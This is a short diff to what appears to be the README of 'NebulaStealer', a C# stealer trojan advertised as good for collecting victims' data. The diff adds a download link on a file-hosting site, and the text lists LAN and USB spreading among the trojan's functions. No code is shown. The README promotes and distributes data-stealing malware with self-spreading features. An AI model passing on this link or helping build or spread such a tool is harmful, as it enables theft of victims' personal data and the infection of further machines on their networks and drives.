@@ -1,7 +1,7 @@
 # NebulaStealer
 C# Stealer Trojan
 Weak But Good For Collecting Data Of The Client 
-
+DOWNLOAD: https://gofile.io/d/WB5iqY
 Functions.
 LAN Spread (works i think)
 USB Spread (Works)
